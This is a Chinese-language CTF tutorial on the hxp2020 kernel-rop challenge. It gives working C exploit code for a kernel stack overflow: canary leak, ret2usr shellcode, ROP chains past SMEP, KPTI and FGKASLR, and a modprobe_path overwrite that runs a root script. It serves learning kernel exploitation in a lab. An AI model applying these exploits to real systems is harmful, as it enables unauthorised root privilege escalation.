# Linux Kernel-Pwn Learning


# Kernel ROP

学习Linux kernel Pwn的第一次尝试，hxp2020: kernel-rop

Thanks [@Midas](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/) for so great tutorials !

## 环境设置

将附件解压得到以下文件：

- `initramfs.cpio.gz`：压缩的文件系统，诸如`/bin`、`/etc`... 都被放入这里。其中也可能包含有漏洞的模块
- `vmlinuz`：压缩的Linux kernel镜像，我们可以从中提取出kernel ELF文件。
- `run.sh`：运行kernel的shell脚本，我们可以在这里更改内核的启动选项。为了正常运行我们需要提前安装`qemu`。

其他文件`Dockerfile`、`yneted`等都是帮助我们搭建本地服务环境的。

### Kernel

```bash
./extract-image.sh ./vmlinuz > vmlinux
```

提取内核ELF文件到`vmlinux`。

下一步，我们要提取kernel中的`gadget`，但是由于kernel很大，使用`ROPgadget`需要几分钟的时间。所以，我们提前将所有`gadget`放入文件中。

```bash
ROPgadget --binary ./vmlinux > gadgets.txt
```

这可能需要很久。可以用ropper，听说会更快。

### 文件系统

使用脚本将其解压

```bash
mkdir initramfs
cd initramfs
cp ../initramfs.cpio.gz .
gunzip ./initramfs.cpio.gz
cpio -idm < ./initramfs.cpio
rm initramfs.cpio
```

解压后的文件系统在`initramfs`文件夹中，其中有一个`hackme.ko`的驱动。很明显我们要利用它。

解压文件系统的另一个目的是更改其中的一些设置，便于我们在后面对一些文件的访问。在`/etc`的文件中，找到这样的命令并修改它，本题中为`inittab`文件

```bash
setuidgid 1000 /bin/sh
# Modify it into the following
setuidgid 0 /bin/sh
```

**在完成利用后，我们要把它切换回1000**

在修改完成后我们要将其压缩回去，使用`compress.sh`：

```bash
gcc -o exploit -static $1
mv ./exploit ./initramfs
cd initramfs
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > initramfs.cpio.gz
mv ./initramfs.cpio.gz ../
```

前两行是编译我们的exp，把它加入到文件系统中。

>在很多教程中，都使用了busybox模拟文件系统。如果题目提供了文件系统，也可以使用这种直接解压的方式。两种方式所要达到的目的是一样的，按个人习惯选择即可。脚本经过修改都是通用的。

### run.sh

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
```

- `-m`：指定内存大小，如果不能启动可以尝试增加内存
- `-cpu`：指定cpu的模式，`+smep`和`+smap`是一些保护机制
- `-kernel`：指定内核镜像文件
- `-initrd`：指定文件系统文件
- `-append`：指定其他一些启动选项，包括一些保护机制

加入`-s`选项，我们可以在本地的1234端口进行调试。

```bash
$ gdb vmlinux
(gdb) target remote localhost:1234
```

### How to debug kernel

调试内核，首先需要一个断点。使用`lsmod`可以列出所有加载的模块，及其基址（root权限）。如果没有想要的模块可以使用`insmod`加载指定的模块。用`rmmod`卸载指定模块。

经过IDA静态分析使用`base + offset`的方式断在我们想要的地方。但是内核对象很特殊，或者说目前的工具对内核的调试支持并不是十分完美。当然，windbg对内核调试的支持很好。所以，你下的断点是很有可能有断不下来的情况。另外，内核在单步调试时极有可能出现跑飞的现象，停在一个你不知道的地方。使用`si`可以一定程度上避免这样。而这就要求我们必须将断点下的更加有针对性。

gdb还有可能将函数名进行错误识别，都是正常情况。

## Linux kernel 缓解机制

- **Kernel stack cookies（canary）**：内核栈的canary保护。

- **Kernel address space layout randomization（KASLR）**：内核地址随机化；与用户态的`ASLR`一样，将内核地址随机加载。

- **Function Granular KASLR**： 与用户态不同的是，内核态的函数相对于基址的偏移在加载时也被随机化了。在开启`FGKASLR`后，内核有一小部分的数据偏移是确定的。

  个人理解：要想对所有的数据进行如此强度的随机化是不可能的，内核也是程序，在程序运行过程中，总有一些关于加载的数据需要访问，这部分数据必须要让内核准确的知道其所在的地址。那么，这部分数据就是不能随机化的。

- **Supervisor mode execution protection（SMEP）**：当进程属于内核态时，所有的用户空间的页在页表中都被标记为不可执行。在kernel中，通过将`CR4`寄存器的`20th bit`置位来使能。在启动时，通过在`-cpu`上`+smep`来启用，在`-append`的中加入`nosmep`来禁用。

- **Supervisor Mode Access Prevention （SMAP）**：`SMEP`的补充。在内核态时，用户空间的任何页面都是不可访问的。在kernel中，通过将`CR4`寄存器的`2th bit`置位来使能。在启动时，通过在`-cpu`上`+smap`来启用，在`-append`的中加入`nosmap`来禁用。

- **Kernel page-table isolation（KPTI）**：当这个机制使能时，内核将用户空间和内核空间的页表完全分开。此时，内核态的页表拥有内核空间和用户空间的页，用户态的页表包含了用户空间和最小的内核空间。它可以通过在`-append`选项下添加`kpti=1`或`nopti`来启用/禁用。

## Kernel module: hackme.ko

内核模块（驱动）也是ELF文件，我们在IDA中进行分析。

`init_module`注册了一个名为`hackme`的设备，包含以下操作：`hackme_read`，`hackme_write`，`hackme_open` 和 `hackme_release`。我们可以通过`open("/dev/hackme")`来与之交互，调用它注册的操作。

```c
unsigned __int64 __fastcall hackme_read(__int64 a1, __int64 user_buf)
{
  unsigned __int64 v2; // rdx
  unsigned __int64 size; // rbx
  bool v4; // zf
  unsigned __int64 result; // rax
  _QWORD buf[20]; // [rsp-A0h] [rbp-A0h] BYREF

  _fentry__(a1, user_buf);
  size = v2;                                    // from 3rd arg
  buf[16] = __readgsqword(0x28u);
  _memcpy(&hackme_buf, buf, v2);
  if ( size > 0x1000 )
  {
    _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL);
    BUG();
  }
  _check_object_size(&hackme_buf, size, 1LL);
  v4 = copy_to_user(user_buf, &hackme_buf, size) == 0;
  result = -14LL;
  if ( v4 )
    result = size;
  return result;
}

unsigned __int64 __fastcall h_write(__int64 a1, __int64 user_buf, unsigned __int64 size)
{
  char buf[128]; // [rsp+0h] [rbp-98h] BYREF
  unsigned __int64 v6; // [rsp+80h] [rbp-18h]

  v6 = __readgsqword(0x28u);
  if ( size > 0x1000 )
  {
    _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL);
    BUG();
  }
  _check_object_size(&hackme_buf, size, 0LL);
  if ( copy_from_user(&hackme_buf, user_buf, size) )
    return -14LL;
  _memcpy(buf, &hackme_buf, size);
  return size;
}
```

漏洞很明显，我们可以从内核栈上读写最多`0x1000`的数据，这造成了溢出。

## First step：ret2usr

我们从最简单的开始学习，在用户态，当`ASLR`和`NX`都关闭时，我们可以想到常用的利用方式`ret2shellcode`。同样，当关闭几乎所有的保护后我们也可以返回到自己写的代码中。这个过程在内核态执行用户空间的代码，所以被称为`ret2usr`。

在开始之前，修改`run.sh`除去`+smep`、`+smap`、`kpti=1`、`kaslr`并添加`nopti`和`nokaslr`。

### Open the device

在交互之前我们需要打开设备。

```c
int global_fd;	// 为了让其他函数能与设备交互

void open_dev() {
    global_fd = open("/dev/hackme", O_RDWR);
	if (global_fd < 0) {
		puts("[!] Failed to open device");
		exit(-1);
	} else {
        puts("[*] Opened device");
    }
}
```

### Leak canary

因为还有栈保护，所以还要先leak canary信息。

```c
unsigned long canary;

void leak(void){
    unsigned n = 20;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    canary = leak[16];

    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Cookie: %lx\n", canary);
}
```

### Overwrite return addr

下面我们就要覆盖返回地址了

```c
void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = canary;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = (unsigned long)pwned_addr; // ret

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}
```

### User shellcode

在用户态下我们的目的往往是执行`system("/bin/sh")`等，用来获取一个`shell`。在内核中，我们已经get shell了，但是权限却只是普通用户。我们需要得到一个`root shell`，来完全控制这个系统。

Linux系统下，每个进程拥有其对应的`struct cred`，用于记录该进程的uid。内核exploit的目的，便是修改当前进程的cred，从而提升权限。当然，进程本身是无法篡改自己的cred的，我们需要在内核空间中，通过以下方式来达到这一目的：

```c
commit_creds(prepare_kernel_cred(0));
```

其中，`prepare_kernel_cred()`创建一个新的cred，参数为0则将cred中的uid, gid设置为0，对应于root用户。随后，`commit_creds()`将这个cred应用于当前进程。此时，进程便提升到了root权限。

为此，我们需要寻找这两个函数的地址。因为`KASLR`被禁用了，我们以root权限启动的内核，可以通过打开`/proc/kallsyms`，来找到所有内核函数的地址。

```bash
/ # cat /proc/kallsyms |grep commit_creds
ffffffff814c6410 T commit_creds
ffffffff81f87d90 r __ksymtab_commit_creds
ffffffff81fa0972 r __kstrtab_commit_creds
ffffffff81fa4d42 r __kstrtabns_commit_creds
/ # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff814c67f0 T prepare_kernel_cred
ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred
ffffffff81fa09b2 r __kstrtab_prepare_kernel_cred
ffffffff81fa4d42 r __kstrtabns_prepare_kernel_cred
```

这样我们就可以编写自己的shellcode了。

```c
void pwned_addr(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff814c6410;" //commit_creds
	    "call rax;"
        ...
        ".att_syntax;"
    );
}
```

### Return to userland

现在我们写的exp，是没有办法获得root权限的。原因是，内核态和用户态是隔离的，当我们执行shellcode时，我们还在内核态，它不会把结果给用户，它没有返回。所以，我们需要其返回用户态。

这里要再讲一下，用户态与内核态之间的切换。当用户态主动进入内核时（系统调用、异常），就会陷入内核态，此时有特权级的提升，涉及到堆栈的切换。首先，要保存`user_ss(segment selector)`、`user_sp`、`user_flags`、`user_cs`、`user_ip`以及`err`等信息。在返回的时候要恢复这些寄存器的值。

对于我们的shellcode，在开始之前也要先保存这些信息，以便在返回的时候让系统走正常的流程。

```c
unsigned long user_cs,user_ss,user_sp,user_rflags,user_rip;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}
```

没有直接操作标志寄存器的方法，所以使用了`pushf`。另外，我们返回时需要恢复这些值，同时还要恢复`gs`的值。`gs`寄存和`fs`寄存器都是附件段的段寄存器，这些寄存器的具体作用由系统来决定，在Linux中，`gs`指向TLS结构，通过这个我们可以获取内核堆栈地址等重要信息。在返回时，我们要通过`swapgs`将其切换回用户态的`gs`。返回要使用`iret`：

`iret`指令会按顺序依次弹出`eip`、`cs`以及`eflag`的值到特定寄存器中，然后从新的`cs:ip`处开始执行。如果特权级发生改变，则还会在弹出`eflag`后再依次弹出`sp`与`ss`寄存器值。

修改shellcode:

```c
unsigned long user_rip = (unsigned long)get_shell;

void pwned_addr(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff814c6410;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}
```

最后，我们的脚本

```c
int main() {
    save_state();
    open_dev();
    leak();
    overflow();  
    puts("[!] Should never be reached");
    return 0;
}
```

result:

```bash
/ $ id
uid=1000 gid=1000 groups=1000
/ $ ./exploit 
[*] Saved state
[*] Opened device
[*] Leaked 160 bytes
[*] Cookie: 6b6c612b1bbb5500
[*] Prepared payload
[*] Returned to userland
[*] UID: 0, got root!
/ # id
uid=0 gid=0
/ # cat /dev/s
sda       sg0       sg1       snapshot  sr0
/ # cat /dev/sda
hxp{t0p_d3feNSeS_Vs_1337_h@ck3rs}
```

## Add SMEP&Kernel-ROP

下面增加难度，开启`SMEP`缓解机制。在这之后，所有的用户空间页在内核态都是不可执行的。这使得我们的shellcode无法在内核态执行，`ret2usr`失效了。我们的目的依然没有变化，在内核态执行`commit_creds(prepare_kernel_cred(0))`。

此时，我们有两种思路：

- `SMEP`由CR4寄存器控制，我们改写CR4的第20比特，使`SMEP`失效；
- 在内核中寻找`gadget`构造ROP链，并返回。

### Trying to overwrite CR4

理论上，我们可以使用`native_write_cr4()`改变CR4的值，这个方法很简单直接。但是，人们也注意到了这让内核陷入无比危险的境地。所以，内核在启动时会将CR4固定，如果试图改变就会触发错误。[a documentation on CR4 bits pinning](https://patchwork.kernel.org/project/kernel-hardening/patch/20190220180934.GA46255@beast/)

这种方法不可行。

### 构造ROP chain

我们需要以下功能：

- `prepare_kernel_cred(0)`
- `commit_creds()`
- `swapgs;ret`
- 恢复寄存器，`iretq`

寻找gadget

```c
/*
0xffffffff81006370 : pop rdi ; ret
0xffffffff8150b97e : pop rsi ; ret
0xffffffff81007616 : pop rdx ; ret
0xffffffff815f4bbc : pop rcx ; ret
0xffffffff81004d11 : pop rax ; ret
0xffffffff81006158 : pop rbx ; ret
0xffffffff8144591b : pop r13 ; ret
0xffffffff8100636d : pop r12 ; pop r15 ; ret
0xffffffff8100636f : pop r15 ; ret

0xffffffff8100a55f : swapgs ; pop rbp ; ret
0xffffffff8100c0d9:	48 cf                	iretq
0xffffffff8166fea3 : mov rdi, rax ; jne 0xffffffff8166fe73 ; pop rbx ; pop rbp ; ret
0xffffffff8166ff23 : mov rdi, rax ; jne 0xffffffff8166fef3 ; pop rbx ; pop rbp ; ret

0xffffffff816bfe27 : cmp rdi, rsi ; jne 0xffffffff816bfdfa ; pop rbp ; ret
*/
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long pop_rsi_ret = 0xffffffff8150b97e;
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;
unsigned long iretq = 0xffffffff8100c0d9;
unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3;
unsigned long cmp_rdi_rsi_jne_pop_ret = 0xffffffff816bfe27;
```

```bash
$ objdump -j .text -d ./vmlinux | grep iretq | head -1
ffffffff8100c0d9:	48 cf                	iretq 
```

有时ROPgadget找到的gadget并不在可执行区，我们需要再找其他的gadget。

```c
    payload[off++] = canary;
    payload[off++] = 0x0;                 // rbx
    payload[off++] = 0x0;                 // r12
    payload[off++] = 0x0;                 // rbp
    payload[off++] = pop_rdi_ret;         // return address
    payload[off++] = 0x0;                 // rdi <- 0
    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
    payload[off++] = pop_rdi_ret;
    payload[off++] = 0x1; // rdi <- 1
    payload[off++] = pop_rsi_ret;
    payload[off++] = 0x1; // rsi <- 1
    payload[off++] = cmp_rdi_rsi_jne_pop_ret;
    payload[off++] = 0x0;                      // dummy rbp
    payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax
    payload[off++] = 0x0;                      // dummy rbx
    payload[off++] = 0x0;                      // dummy rbp
    payload[off++] = commit_creds;    // commit_creds(prepare_kernel_cred(0))
    payload[off++] = swapgs_pop_ret; // swapgs
    payload[off++] = 0x0;             // dummy rbp
    payload[off++] = iretq;           // iretq frame
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;
```

### Stack pivot

我们再加大一些难度假设另一种情况：溢出的长度不足以写入完整的ROP链。此时，就要进行栈迁移。

我们可以找到这样的gadget

```c
0xffffffff810062dc : mov rsp, rbp ; pop rbp ; ret
```

`rbp`在我们返回的时候就已经可以控制了，所以只要申请一块内存并控制其内容就可以了。

```c
void build_fake_stack(void){
    fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    unsigned off = 0x1000 / 8;
    fake_stack[0] = 0xdead; // put something in the first page to prevent fault
    fake_stack[off++] = 0x0; // dummy rbp
    fake_stack[off++] = pop_rdi_ret;         // return address
    fake_stack[off++] = 0x0;                 // rdi <- 0
    fake_stack[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
    fake_stack[off++] = pop_rdi_ret;
    fake_stack[off++] = 0x1; // rdi <- 1
    fake_stack[off++] = pop_rsi_ret;
    fake_stack[off++] = 0x1; // rsi <- 1
    fake_stack[off++] = cmp_rdi_rsi_jne_pop_ret;
    fake_stack[off++] = 0x0;                      // dummy rbp
    fake_stack[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax
    fake_stack[off++] = 0x0;                      // dummy rbx
    fake_stack[off++] = 0x0;                      // dummy rbp
    fake_stack[off++] = commit_creds;    // commit_creds(prepare_kernel_cred(0))
    fake_stack[off++] = swapgs_pop_ret; // swapgs
    fake_stack[off++] = 0x0;             // dummy rbp
    fake_stack[off++] = iretq;           // iretq frame
    fake_stack[off++] = user_rip;
    fake_stack[off++] = user_cs;
    fake_stack[off++] = user_rflags;
    fake_stack[off++] = user_sp;
    fake_stack[off++] = user_ss;
}
```

这里`0x5b000000 - 0x1000`是为了让栈有增长的空间，以顺利的执行其他函数。

## Add KPTI

有了`KPTI`用户空间页表与内核空间页表隔离开。我们从内核态直接使用`iretq`返回，没有切换页表。所以当用户态的程序想要执行时会造成段错误。这里有两种方法进行bypass：

- 执行正常返回应该执行的函数。
- 使用信号处理：在Linux中，我们可以注册信号处理函数。在`Segmentation fault`时，内核会向进程发送一个`SIGSEGV`信号。一般情况下，这个信号使程序进行异常处理，异常处理的程序在内核代码中，最终结果是杀死这个进程。如果我们注册了处理服务，内核在处理时就会回到用户态！这正达成了我们的目的。

### Normal ROP

正常返回时会调用的函数为`swapgs_restore_regs_and_return_to_usermode`。我们通过`/proc/kallsyms`得到它的地址。

```bash
/ # cat /proc/kallsyms |grep swapgs_restore_regs_and_return_to_usermode
ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
```

这个函数在ida中是这样的：

```assembly
.text:FFFFFFFF81200F10                 pop     r15
.text:FFFFFFFF81200F12                 pop     r14
.text:FFFFFFFF81200F14                 pop     r13
.text:FFFFFFFF81200F16                 pop     r12
.text:FFFFFFFF81200F18                 pop     rbp
.text:FFFFFFFF81200F19                 pop     rbx
.text:FFFFFFFF81200F1A                 pop     r11
.text:FFFFFFFF81200F1C                 pop     r10
.text:FFFFFFFF81200F1E                 pop     r9
.text:FFFFFFFF81200F20                 pop     r8
.text:FFFFFFFF81200F22                 pop     rax
.text:FFFFFFFF81200F23                 pop     rcx
.text:FFFFFFFF81200F24                 pop     rdx
.text:FFFFFFFF81200F25                 pop     rsi
.text:FFFFFFFF81200F26                 mov     rdi, rsp
.text:FFFFFFFF81200F29                 mov     rsp, qword ptr gs:unk_6004
.text:FFFFFFFF81200F32                 push    qword ptr [rdi+30h]
.text:FFFFFFFF81200F35                 push    qword ptr [rdi+28h]
.text:FFFFFFFF81200F38                 push    qword ptr [rdi+20h]
.text:FFFFFFFF81200F3B                 push    qword ptr [rdi+18h]
.text:FFFFFFFF81200F3E                 push    qword ptr [rdi+10h]
.text:FFFFFFFF81200F41                 push    qword ptr [rdi]
.text:FFFFFFFF81200F43                 push    rax
.text:FFFFFFFF81200F44                 jmp     short loc_FFFFFFFF81200F89
...
```

前面多出了很多`pop xxx`这无疑会加长我们的ROP链，所以我们可以从`swapgs_restore_regs_and_return_to_usermode+22`开始。

还有一些值得关注的地方。

```assembly
.text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:
.text:FFFFFFFF81200F89                               pop     rax
.text:FFFFFFFF81200F8A                               pop     rdi
.text:FFFFFFFF81200F8B                               call    cs:off_FFFFFFFF82040088
.text:FFFFFFFF81200F91                               jmp     cs:off_FFFFFFFF82040080
...
.text.native_swapgs:FFFFFFFF8146D4E0                 push    rbp
.text.native_swapgs:FFFFFFFF8146D4E1                 mov     rbp, rsp
.text.native_swapgs:FFFFFFFF8146D4E4                 swapgs
.text.native_swapgs:FFFFFFFF8146D4E7                 pop     rbp
.text.native_swapgs:FFFFFFFF8146D4E8                 retn
...
.text:FFFFFFFF8120102E                               mov     rdi, cr3
.text:FFFFFFFF81201031                               jmp     short loc_FFFFFFFF81201067
...
.text:FFFFFFFF81201067                               or      rdi, 1000h
.text:FFFFFFFF8120106E                               mov     cr3, rdi
...
.text:FFFFFFFF81200FC7                               iretq
```

在`jmp     short loc_FFFFFFFF81200F89`后，有两个多的`pop`所以我们要体现布置好填充。

```c
    payload[off++] = commit_creds;    // commit_creds(prepare_kernel_cred(0))
    payload[off++] = kpti_pass; // swwapgs_restore_regs_and_return_to_usermode
    payload[off++] = 0;           // dummy rax
    payload[off++] = 0;           // dummy rdi
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;
```

### Signal handler

保持原来的payload不变，在main中进行处理函数注册`signal(SIGSEGV, get_shell);`

绝妙的主意！

## Add SMAP

添加`SMAP`后用户态的页面无法被访问，这并没有影响我们的ROP。但是栈迁移无法被使用，我们无法将栈劫持到用户空间。

目前绕过的技术仍然未知。TODO

## Add KASLR

现在，我们面对完整的挑战了！

如果仅仅使用`KASLR`我们可以在栈上泄露内核的基址并通过偏移找到其他所有函数。这没有增加太大的困难。在`FGKASLR`下，即使我们知道了内核的基址，其他函数的偏移依然无法确定。

> 运行多次并查看`/proc/kallsyms`，发现每次偏移都不同，则开启的`FGASLR`

在`FGKASLR`下有一些偏移是不变的：

- 从`_text`到`__x86_retpoline_r15`，即`_text+0x400dc6`
- `swwapgs_restore_regs_and_return_to_usermode`没有变化
- `ksymtab`地址，该结构记录其他所有函数的地址信息。我们可以从中得到`prepare_kernel_cred`和`commit_creds`。

```c
struct kernel_symbol {
	  int value_offset;		// funcxx_addr = ksymtab_funcxx_addr + value_offset
	  int name_offset;
	  int namespace_offset;
};
```

寻找能使用的gadget。

```c
/*
ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred
ffffffff81f87d90 r __ksymtab_commit_creds

0xffffffff81015a7f : mov rax, qword ptr [rax] ; pop rbp ; ret

0xffffffff81004d11 : pop rax ; ret
0xffffffff81006370 : pop rdi ; ret
0xffffffff81007616 : pop rdx ; ret
0xffffffff81006158 : pop rbx ; ret
0xffffffff8100636d : pop r12 ; pop r15 ; ret
0xffffffff8100636f : pop r15 ; ret
0xffffffff8100636e : pop rsp ; pop r15 ; ret
*/

void leak(void)
{
    unsigned n = 40;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    canary = leak[16];
    kernel_base = leak[38] - 0xa157ULL;
    kpti_pass = kernel_base + 0x200f10ULL + 22ULL;
    pop_rax = kernel_base + 0x4d11ULL;
    pop_rdi = kernel_base + 0x6370ULL;
    pop_rdx = kernel_base + 0x7616ULL;
    pop_rbx = kernel_base + 0x6158ULL;
    ksymtab_prepare_kernel_cred = kernel_base + 0xf8d4fcULL;
    ksymtab_commit_creds = kernel_base + 0xf87d90ULL;
    read_mrax_pop = kernel_base + 0x15a7fULL;

    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Cookie: %lx\n", canary);
}
```

### Leak prepare_kernel_cred() & commit_creds()

通过`mov rax, qword ptr [rax]`可以将`value_offset`读出，放入到`rax`中，之后返回用户态，将`rax`的存入变量中。

```c
    payload[off++] = canary;
    payload[off++] = 0x0;                 // rbx
    payload[off++] = 0x0;                 // r12
    payload[off++] = 0x0;                 // rbp
    payload[off++] = pop_rax;             // return address
    payload[off++] = ksymtab_commit_creds;                 
    payload[off++] = read_mrax_pop;   		// rax <-- [rax]
    payload[off++] = 0x0;                 //dummy rbp
    payload[off++] = kpti_pass; 		// swapgs_restore_regs_and_return_to_usermode
    payload[off++] = 0;           	// dummy rax
    payload[off++] = 0;           	// dummy rdi
    payload[off++] = (unsigned long)get_commit_creds;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

void get_prepare_kernel_cred()
{
        __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;"
    );
    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_store;
    printf("    --> prepare_kernel_cred: %lx\n", prepare_kernel_cred);
    call_prepare_kernel_cred();
}
```

泄露的payload结构如上，虽然，`kpti_pass`有会`pop rax`但是在返回后其值依然会恢复。

### Call prepare_kernel_cred() & commit_creds()

在我们泄露地址后，之后就是常规的ROP。在`commit_creds`返回`creds`后，依然要将其保存。因为之前进行`rax --> rdi`的gadget都不能用了。

```c
    payload[off++] = canary;
    payload[off++] = 0x0;                 // rbx
    payload[off++] = 0x0;                 // r12
    payload[off++] = 0x0;                 // rbp
    payload[off++] = pop_rdi;             // return address
    payload[off++] = 0;                 // rdi <- 0
    payload[off++] = prepare_kernel_cred;   // prepare_kernel_cred(0)
    payload[off++] = kpti_pass; // swwapgs_restore_regs_and_return_to_usermode
    payload[off++] = 0;           // dummy rax
    payload[off++] = 0;           // dummy rdi
    payload[off++] = (unsigned long)get_creds;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;
```

### Get root shell !

```bash
/ $ id
uid=1000 gid=1000 groups=1000
/ $ ./exploit 
[*] Saved state
[*] Opened device
[*] Leaked 320 bytes
[*] Cookie: a230d00be9113d00
[*] Prepared leak_commit_creds pa
    --> commit_creds: ffffffffb2a
[*] Prepared leak_prepare_kernel_
    --> prepare_kernel_cred: ffff
[*] Prepared call_prepare_kernel_
[*] get cred
[*] Prepared call_commit_creds pa
[*] Returned to userland
[*] UID: 0, got root!
/ # id
uid=0 gid=0
/ # cat /dev/sda
hxp{t0p_d3feNSeS_Vs_1337_h@ck3rs}
```

## Technique: Overwriting modprobe_path

> **什么是`modprobe`?**
>
>  “`modprobe` is a Linux program originally written by Rusty Russell and used to add a loadable kernel module to the Linux kernel or to remove a loadable kernel module from the kernel”
>
> 当我们安装或卸载一个内核模块时，`modprobe`就会被执行。而其默认路径`modprobe_path`就是`/sbin/modprobe`

可以通过以下命令查看：

```bash
/ # cat /proc/sys/kernel/modprobe
/sbin/modprobe
```

`modprobe_path`是一个全局变量，这意味着，我们可以通过`/proc/kallsyms`得到它。

当我们执行一个未知类型的文件，`modprobe_path`指向的文件就会被执行

```c
static int call_modprobe(char *module_name, int wait)
{
    ...
  	argv[0] = modprobe_path;
  	argv[1] = "-q";
  	argv[2] = "--";
  	argv[3] = module_name;
  	argv[4] = NULL;

  	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
					 NULL, free_modprobe_argv, NULL);
    ...
}
```

如果，将路径覆盖指向我们编写的shell脚本，就实现了以root权限执行任意脚本的目的。

### Leak modprobe_path

第一步，首先泄露地址。

```c
    canary = leak[16];
    kernel_base = leak[38] - 0xa157ULL;
    kpti_pass = kernel_base + 0x200f10ULL + 22ULL;
    pop_rax = kernel_base + 0x4d11ULL;
    pop_rdi = kernel_base + 0x6370ULL;
    pop_rdx = kernel_base + 0x7616ULL;
    pop_rbx = kernel_base + 0x6158ULL;
    ksymtab_prepare_kernel_cred = kernel_base + 0xf8d4fcULL;
    ksymtab_commit_creds = kernel_base + 0xf87d90ULL;
    read_mrax_pop = kernel_base + 0x15a7fULL;
    modprobe_path = kernel_base + 0x1061820ULL;
    write_mrbx_rax_pop2 = kernel_base + 0x306dULL;
//0xffffffff8100306d : mov qword ptr [rbx], rax ; pop rbx ; pop rbp ; ret
```

与之前的并没有太大差别。这次要写内存，所以要找一个新`gadget`

### Overwrite

```c
    payload[off++] = canary;
    payload[off++] = 0x0;                 // rbx
    payload[off++] = 0x0;                 // r12
    payload[off++] = 0x0;                 // rbp
    payload[off++] = pop_rax;             // return address
    payload[off++] = 0x782f706d742f; 	// rax <- "/tmp/x";   
    payload[off++] = pop_rbx; 
    payload[off++] = modprobe_path;              
    payload[off++] = write_mrbx_rax_pop2;   // [rbx] <-- rax
    payload[off++] = 0x0;                 //dummy rbp
    payload[off++] = 0x0; 
    payload[off++] = kpti_pass; // swwapgs_restore_regs_and_return_to_usermode
    payload[off++] = 0;           // dummy rax
    payload[off++] = 0;           // dummy rdi
    payload[off++] = (unsigned long)get_flag;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;
```

下一步，我们要让创建一个未知类型的文件，让系统执行，这样系统就会去执行我们的`/tmp/x`。所以我们的脚本要读出`flag`。

```c
void get_flag(void){
    puts("[*] Returned to userland, setting up for fake modprobe");
    
    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");

    exit(0);
}

```

### Get flag !

```c
/ $ id
uid=1000 gid=1000 groups=1000
/ $ ./exploit 
[*] Saved state
[*] Opened device
[*] Leaked 320 bytes
    --> Cookie: 3c8fec292491ab00
    --> Image base: ffffffff8c800000
[*] Prepared leak_commit_creds payload
[*] Returned to userland, setting up for fake modprobe
[*] Run unknown file
/tmp/dummy: line 1: ����: not found
